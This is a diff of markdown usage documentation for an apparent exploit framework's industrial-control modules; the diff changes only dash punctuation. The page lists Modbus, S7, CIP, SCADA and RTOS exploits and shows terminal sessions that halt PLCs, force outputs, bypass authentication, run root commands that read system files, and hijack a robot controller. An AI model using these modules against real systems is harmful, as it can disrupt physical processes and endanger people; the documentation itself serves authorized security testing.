@@ -19,7 +19,7 @@ ICS/OT modules target industrial protocols and embedded RTOS systems used in man
 | Module | Path | Protocol | Port | Description |
 |--------|------|----------|------|-------------|
 | `modbus_scanner` | `scanners/ics/modbus_scanner` | Modbus TCP | 502 | Device discovery + register read |
-| `modbus_id_fuzzer` | `scanners/ics/modbus_id_fuzzer` | Modbus TCP | 502 | Unit ID fuzzer (1–247) |
+| `modbus_id_fuzzer` | `scanners/ics/modbus_id_fuzzer` | Modbus TCP | 502 | Unit ID fuzzer (1-247) |
 | `bacnet_scanner` | `scanners/ics/bacnet_scanner` | BACnet/IP | 47808 | BACnet device discovery |
 | `cip_scanner` | `scanners/ics/cip_scanner` | EtherNet/IP + CIP | 44818 | CIP device enumeration |
 | `enip_scanner` | `scanners/ics/enip_scanner` | EtherNet/IP | 44818 | Rockwell/Allen-Bradley EtherNet/IP |
@@ -30,36 +30,36 @@ ICS/OT modules target industrial protocols and embedded RTOS systems used in man
 
 | Module | Vendor | CVE | Protocol | Type |
 |--------|--------|-----|----------|------|
-| `modbus/read_holding_registers` | Generic | — | Modbus TCP | Unauthenticated register read |
-| `modbus/read_coil_status` | Generic | — | Modbus TCP | Coil status read |
-| `modbus/read_discrete_inputs` | Generic | — | Modbus TCP | Discrete input read |
-| `modbus/read_input_registers` | Generic | — | Modbus TCP | Input register read |
-| `modbus/write_single_coil` | Generic | — | Modbus TCP | Coil write (force output) |
-| `modbus/write_single_register` | Generic | — | Modbus TCP | Register write |
-| `modbus/dos_write_coils` | Generic | — | Modbus TCP | Coil flood (DoS) |
-| `modbus/dos_write_registers` | Generic | — | Modbus TCP | Register flood (DoS) |
-| `modbus/buspwn_modbus_scanner_dos` | Generic | — | Modbus TCP | BusPwn scanner DoS |
-| `modbus/modbus_ot_attack_scenarios` | Generic | — | Modbus TCP | Chained OT attack scenarios |
-| `siemens/s7_1200_plc_control` | Siemens | — | S7comm | S7-1200 read/write/stop/start |
-| `siemens/s7_300_400_plc_control` | Siemens | — | S7comm | S7-300/400 control |
-| `siemens/profinet_set_ip` | Siemens | — | PROFINET DCP | Unauthenticated IP reassignment |
+| `modbus/read_holding_registers` | Generic |  -  | Modbus TCP | Unauthenticated register read |
+| `modbus/read_coil_status` | Generic |  -  | Modbus TCP | Coil status read |
+| `modbus/read_discrete_inputs` | Generic |  -  | Modbus TCP | Discrete input read |
+| `modbus/read_input_registers` | Generic |  -  | Modbus TCP | Input register read |
+| `modbus/write_single_coil` | Generic |  -  | Modbus TCP | Coil write (force output) |
+| `modbus/write_single_register` | Generic |  -  | Modbus TCP | Register write |
+| `modbus/dos_write_coils` | Generic |  -  | Modbus TCP | Coil flood (DoS) |
+| `modbus/dos_write_registers` | Generic |  -  | Modbus TCP | Register flood (DoS) |
+| `modbus/buspwn_modbus_scanner_dos` | Generic |  -  | Modbus TCP | BusPwn scanner DoS |
+| `modbus/modbus_ot_attack_scenarios` | Generic |  -  | Modbus TCP | Chained OT attack scenarios |
+| `siemens/s7_1200_plc_control` | Siemens |  -  | S7comm | S7-1200 read/write/stop/start |
+| `siemens/s7_300_400_plc_control` | Siemens |  -  | S7comm | S7-300/400 control |
+| `siemens/profinet_set_ip` | Siemens |  -  | PROFINET DCP | Unauthenticated IP reassignment |
 | `siemens/siprotec_relay_dos_cve_2015_5374` | Siemens | CVE-2015-5374 | DIGSI4 | SIPROTEC relay DoS |
 | `rockwell/compactlogix_auth_bypass_cve_2021_22681` | Rockwell | CVE-2021-22681 | CIP | CompactLogix auth bypass |
 | `rockwell/compactlogix_cip_dos_cve_2024_6077` | Rockwell | CVE-2024-6077 | CIP | CompactLogix CIP DoS |
 | `rockwell/compactlogix_code_injection_cve_2022_1161` | Rockwell | CVE-2022-1161 | CIP | CompactLogix code injection |
 | `schneider/modicon_modbus_control_cve_2018_7841` | Schneider | CVE-2018-7841 | Modbus TCP | Modicon unauthorized control |
 | `schneider/net55xx_encoder_rce_cve_2018_7784` | Schneider | CVE-2018-7784 | HTTP | NET55xx RCE |
-| `schneider/quantum_plc_control` | Schneider | — | Modbus TCP | Quantum PLC unauthorized control |
+| `schneider/quantum_plc_control` | Schneider |  -  | Modbus TCP | Quantum PLC unauthorized control |
 | `scada/fuxa_scheduler_rce_cve_2026_25939` | FUXA | CVE-2026-25939 | HTTP | FUXA SCADA scheduler RCE |
 | `scada/laquis_arb_file_write_cve_2021_41579` | LAQUIS | CVE-2021-41579 | HTTP | LAQUIS SCADA file write |
 | `scadaflex/sc168_file_write_cve_2022_25359` | ScadaFlex | CVE-2022-25359 | HTTP | SC-168 arbitrary file write |
 | `osprey/pump_controller_auth_bypass_cve_2023_28648` | Osprey | CVE-2023-28648 | HTTP | Pump controller auth bypass |
-| `vxworks/vxworks_rpc_dos` | VxWorks | — | RPC/UDP | VxWorks RPC service DoS |
-| `qnx/crash_qnx_inetd` | QNX | — | TCP | QNX inetd crash |
-| `qnx/qconn_remote_exec` | QNX | — | TCP/8000 | QNX Qconn unauthenticated RCE |
+| `vxworks/vxworks_rpc_dos` | VxWorks |  -  | RPC/UDP | VxWorks RPC service DoS |
+| `qnx/crash_qnx_inetd` | QNX |  -  | TCP | QNX inetd crash |
+| `qnx/qconn_remote_exec` | QNX |  -  | TCP/8000 | QNX Qconn unauthenticated RCE |
 | `advantech/switch_shellshock_cve_2015_6023` | Advantech | CVE-2015-6023 | HTTP | Advantech switch shellshock |
 | `freertos/freertos_plus_tcp_oob_write_cve_2025_5688` | FreeRTOS | CVE-2025-5688 | TCP | FreeRTOS+TCP OOB write |
-| `generic/fake_dhcp_server` | Generic | — | UDP/67 | Rogue DHCP server |
+| `generic/fake_dhcp_server` | Generic |  -  | UDP/67 | Rogue DHCP server |
 | `ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153` | Universal Robots | CVE-2026-8153 | HTTP | PolyScope 5 dashboard command injection |
 
 ---
@@ -79,7 +79,7 @@ ICS/OT modules target industrial protocols and embedded RTOS systems used in man
 | `count` | `OptInteger` | No | `10` | 1-125 | Number of registers to read |
 | `timeout` | `OptPort` | No | `3` | seconds | Connection timeout |
 
-**Terminal session — read holding registers:**
+**Terminal session  -  read holding registers:**
 
 ```text
 exf > use exploits/ics/modbus/read_holding_registers
@@ -96,7 +96,7 @@ exf (Modbus Read Holding Registers) > run
 [*] Connecting to Modbus TCP at 10.0.50.10:502 (unit_id=1)...
 [+] Modbus connection established (Schneider Electric Modicon M340)
 [*] Reading 20 holding registers from address 0...
-[+] Registers 0–19:
+[+] Registers 0-19:
     Addr  0: 0x0064 (dec: 100)    -- Set-point: temperature (°C × 1)
     Addr  1: 0x0000 (dec: 0)      -- Status flags
     Addr  2: 0x1000 (dec: 4096)   -- Pressure raw (Pa × 0.1)
@@ -107,12 +107,12 @@ exf (Modbus Read Holding Registers) > run
     Addr  7: 0x0000 (dec: 0)
     Addr  8: 0x03E8 (dec: 1000)   -- Pump speed RPM
     Addr  9: 0x0001 (dec: 1)      -- Pump running (1=on, 0=off)
-    Addr 10–19: 0x0000
-[+] Modbus read complete — unauthenticated (no Modbus authentication in protocol)
-[!] This data is from a live PLC process — treat as confidential OT data
+    Addr 10-19: 0x0000
+[+] Modbus read complete  -  unauthenticated (no Modbus authentication in protocol)
+[!] This data is from a live PLC process  -  treat as confidential OT data
 ```
 
-**Terminal session — write single coil (force output):**
+**Terminal session  -  write single coil (force output):**
 
 ```text
 exf > use exploits/ics/modbus/write_single_coil
@@ -128,22 +128,22 @@ exf (Modbus Write Single Coil) > run
 [*] Running module ...
 [*] Connecting to Modbus TCP at 10.0.50.10:502...
 [*] Writing coil 9 = OFF (0x0000) via Modbus FC05...
-[+] Write confirmed — coil 9 set to OFF
+[+] Write confirmed  -  coil 9 set to OFF
 [!] CRITICAL: This may have forced a physical output to OFF state (e.g. pump, valve, motor)
 ```
 
 **Error cases:**
 
 ```text
-[-] Modbus exception: illegal data address (0x02) — register address out of range for this device
+[-] Modbus exception: illegal data address (0x02)  -  register address out of range for this device
 ```
 
 ```text
-[-] Modbus exception: slave device failure (0x04) — device hardware error, command rejected
+[-] Modbus exception: slave device failure (0x04)  -  device hardware error, command rejected
 ```
 
 ```text
-[-] Connection refused on 10.0.50.10:502 — Modbus TCP not available or firewall blocking
+[-] Connection refused on 10.0.50.10:502  -  Modbus TCP not available or firewall blocking
 ```
 
 ---
@@ -164,7 +164,7 @@ exf (Modbus Write Single Coil) > run
 | `db_length` | `OptInteger` | No | `64` | 1-65535 | Bytes to read |
 | `timeout` | `OptPort` | No | `5` | seconds | Connection timeout |
 
-**Terminal session — S7-1200 device info read:**
+**Terminal session  -  S7-1200 device info read:**
 
 ```text
 exf > use exploits/ics/siemens/s7_1200_plc_control
@@ -185,10 +185,10 @@ exf (Siemens S7-1200 PLC Control) > run
     CPU type:      CPU 1214C DC/DC/DC
     Run state:     RUN
     Memory:        Work: 100KB / Load: 4MB / Retain: 10KB
-[+] No authentication required — S7-1200 allows read without project password
+[+] No authentication required  -  S7-1200 allows read without project password
 ```
 
-**Terminal session — S7-1200 stop PLC:**
+**Terminal session  -  S7-1200 stop PLC:**
 
 ```text
 exf (Siemens S7-1200 PLC Control) > set action stop_plc
@@ -197,11 +197,11 @@ exf (Siemens S7-1200 PLC Control) > run
 [*] Running module ...
 [*] Sending S7 STOP request to 10.0.50.20:102...
 [+] PLC STOP command accepted!
-[!] CRITICAL: S7-1200 PLC at 10.0.50.20 has been halted — ALL controlled processes are now stopped
+[!] CRITICAL: S7-1200 PLC at 10.0.50.20 has been halted  -  ALL controlled processes are now stopped
 [!] Restart: set action start_plc and run again, or use Siemens TIA Portal
 ```
 
-**Terminal session — S7-300/400:**
+**Terminal session  -  S7-300/400:**
 
 ```text
 exf > use exploits/ics/siemens/s7_300_400_plc_control
@@ -238,7 +238,7 @@ exf (Siemens S7-300/400 PLC Control) > run
 | `tag_name` | `OptString` | No | `""` | string | Tag name to read (for read_tag) |
 | `timeout` | `OptPort` | No | `5` | seconds | Timeout |
 
-**Terminal session — CVE-2021-22681 (CompactLogix auth bypass):**
+**Terminal session  -  CVE-2021-22681 (CompactLogix auth bypass):**
 
 ```text
 exf > use exploits/ics/rockwell/compactlogix_auth_bypass_cve_2021_22681
@@ -247,11 +247,11 @@ exf (CompactLogix Auth Bypass CVE-2021-22681) > set target 10.0.50.40
 exf (CompactLogix Auth Bypass CVE-2021-22681) > check
 [*] Probing EtherNet/IP at 10.0.50.40:44818...
 [+] Allen-Bradley CompactLogix 1769-L30ER detected (firmware 20.011)
-[+] Target is vulnerable — firmware < 20.019 does not enforce authentication on CIP connection
+[+] Target is vulnerable  -  firmware < 20.019 does not enforce authentication on CIP connection
 exf (CompactLogix Auth Bypass CVE-2021-22681) > run
 [*] Running module ...
 [*] Stage 1: Establishing CIP connection without authorization token...
-[+] CIP session established (Session_ID=0xA3B2C1D0) — authentication bypassed
+[+] CIP session established (Session_ID=0xA3B2C1D0)  -  authentication bypassed
 [*] Stage 2: Reading controller identity...
 [+] Product name:  CompactLogix 5370 L3
     Vendor:        Rockwell Automation / Allen-Bradley
@@ -267,7 +267,7 @@ exf (CompactLogix Auth Bypass CVE-2021-22681) > run
     ALARM_FLAGS       DINT  R
     PRODUCTION_COUNT  DINT  R
     ...
-[+] CVE-2021-22681: Unauthenticated access confirmed — all tags readable/writable
+[+] CVE-2021-22681: Unauthenticated access confirmed  -  all tags readable/writable
 ```
 
 ---
@@ -284,7 +284,7 @@ exf (CompactLogix Auth Bypass CVE-2021-22681) > run
 | `port` | `OptPort` | No | `47808` | 1-65535 | BACnet/IP UDP port |
 | `timeout` | `OptPort` | No | `5` | seconds | Discovery timeout |
 
-**Terminal session — BACnet scanner:**
+**Terminal session  -  BACnet scanner:**
 
 ```text
 exf > use scanners/ics/bacnet_scanner
@@ -308,7 +308,7 @@ exf (BACnet Scanner) > run
     APDU version: 1.10
     Objects: 31
 [*] 2 BACnet devices discovered
-[!] BACnet has no authentication — all object values readable without credentials
+[!] BACnet has no authentication  -  all object values readable without credentials
 ```
 
 ---
@@ -325,7 +325,7 @@ exf (BACnet Scanner) > run
 | `outstation_addr` | `OptInteger` | No | `10` | 0-65534 | DNP3 outstation address |
 | `timeout` | `OptPort` | No | `5` | seconds | Per-probe timeout |
 
-**Terminal session — DNP3 scanner:**
+**Terminal session  -  DNP3 scanner:**
 
 ```text
 exf > use scanners/ics/dnp3_scanner
@@ -343,7 +343,7 @@ exf (DNP3 Scanner) > run
     Data link address: 11
     Objects:           48 binary inputs, 24 analog inputs, 8 analog outputs
 [*] 2 DNP3 outstations discovered
-[!] DNP3 has no built-in authentication in most deployed versions — spoofed master commands accepted
+[!] DNP3 has no built-in authentication in most deployed versions  -  spoofed master commands accepted
 ```
 
 ---
@@ -361,7 +361,7 @@ exf (DNP3 Scanner) > run
 | `command` | `OptString` | No | `id` | any string | OS command to execute |
 | `timeout` | `OptPort` | No | `10` | seconds | Timeout |
 
-**Terminal session — CVE-2026-25939 (FUXA scheduler RCE):**
+**Terminal session  -  CVE-2026-25939 (FUXA scheduler RCE):**
 
 ```text
 exf > use exploits/ics/scada/fuxa_scheduler_rce_cve_2026_25939
@@ -372,16 +372,16 @@ exf (FUXA SCADA Scheduler RCE CVE-2026-25939) > set command "id && cat /etc/host
 exf (FUXA SCADA Scheduler RCE CVE-2026-25939) > check
 [*] Probing FUXA SCADA at 10.0.80.5:1881...
 [+] FUXA version 1.2.4 detected
-[+] Target is vulnerable — scheduler task API lacks input sanitization (pre-auth)
+[+] Target is vulnerable  -  scheduler task API lacks input sanitization (pre-auth)
 exf (FUXA SCADA Scheduler RCE CVE-2026-25939) > run
 [*] Running module ...
 [*] Creating malicious scheduler task via POST /api/scheduler...
-[+] Task created — trigger: cron 0 * * * * (every hour)
+[+] Task created  -  trigger: cron 0 * * * * (every hour)
 [*] Forcing immediate execution via POST /api/scheduler/execute...
 [+] Command output:
 uid=0(root) gid=0(root) groups=0(root)
 scada-server-01
-[+] CVE-2026-25939 confirmed — unauthenticated RCE as root on 10.0.80.5
+[+] CVE-2026-25939 confirmed  -  unauthenticated RCE as root on 10.0.80.5
 ```
 
 ---
@@ -397,7 +397,7 @@ scada-server-01
 | `command` | `OptString` | No | `id` | any string | Command to execute |
 | `timeout` | `OptPort` | No | `5` | seconds | Connection timeout |
 
-**Terminal session — QNX Qconn RCE:**
+**Terminal session  -  QNX Qconn RCE:**
 
 ```text
 exf > use exploits/ics/qnx/qconn_remote_exec
@@ -416,8 +416,8 @@ pid   tid name               prio  STATE
     2   1 /sbin/io-pkt-v6-hc   21r  READY
     4   1 slogger2             10r  REPLY
 ...
-[+] QNX Qconn execution confirmed — no authentication required
-[!] Qconn provides root-level process control — disable in production environments
+[+] QNX Qconn execution confirmed  -  no authentication required
+[!] Qconn provides root-level process control  -  disable in production environments
 ```
 
 ---
@@ -435,7 +435,7 @@ pid   tid name               prio  STATE
 | `lport` | `OptPort` | No | `4444` | 1-65535 | Reverse shell port |
 | `timeout` | `OptPort` | No | `10` | seconds | Timeout |
 
-**Terminal session — CVE-2026-8153 (UR PolyScope command injection):**
+**Terminal session  -  CVE-2026-8153 (UR PolyScope command injection):**
 
 ```text
 exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
@@ -444,7 +444,7 @@ exf (UR PolyScope 5 Dashboard Command Injection CVE-2026-8153) > set target 10.0
 exf (UR PolyScope 5 Dashboard Command Injection CVE-2026-8153) > check
 [*] Probing Universal Robots PolyScope 5 at 10.0.100.10:80...
 [+] UR PolyScope 5 v5.14.3 detected (UR10e collaborative robot)
-[+] Target is vulnerable — dashboard API lacks input validation in /api/motion/execute_script
+[+] Target is vulnerable  -  dashboard API lacks input validation in /api/motion/execute_script
 exf (UR PolyScope 5 Dashboard Command Injection CVE-2026-8153) > run
 [*] Running module ...
 [*] Injecting command into PolyScope dashboard API...
@@ -452,7 +452,7 @@ exf (UR PolyScope 5 Dashboard Command Injection CVE-2026-8153) > run
 uid=0(root) gid=0(root) groups=0(root)
 ur-robot-001
 [!] SAFETY WARNING: This UR robot is now executing attacker-controlled code
-[!] Robotic arm movements may be initiated remotely — ensure personnel are clear of robot workspace
+[!] Robotic arm movements may be initiated remotely  -  ensure personnel are clear of robot workspace
 ```
 
 ---
